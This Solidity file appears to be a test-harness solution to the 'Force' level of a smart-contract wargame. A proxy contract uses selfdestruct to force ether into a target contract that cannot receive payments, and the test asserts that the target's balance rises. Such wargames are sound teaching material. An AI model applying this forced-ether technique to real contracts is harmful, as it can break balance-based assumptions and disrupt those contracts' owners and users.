// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract ForceProxy {
    receive () external payable {} 

    function bruteForce(address payable _contract) external {
        selfdestruct(_contract);
    }
}

interface IForceProxy {
  function bruteForce(address payable _contract) external;
}

pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Force} from "../../src/Force/Level.sol";

contract ForceTest is LevelFactory {
  address force;
  IForceProxy forceProxy;

  function setUp() public {
    vm.prank(deployer);
    force = address(new Force());
    forceProxy = IForceProxy(address(new ForceProxy()));
  }

  function testAttack() public {
    submitLevel("Force");
  }

  function _performTest() internal override {
    payable(address(forceProxy)).transfer(1 ether);
    forceProxy.bruteForce(payable(force));
  }

  function _setupTest() internal override {
    super._setupTest();
    vm.deal(attacker, 5 ether);
  }

  function _checkTest() internal override returns (bool) {
    assertGt(force.balance, 0);

    return (force.balance > 0);
  }
}

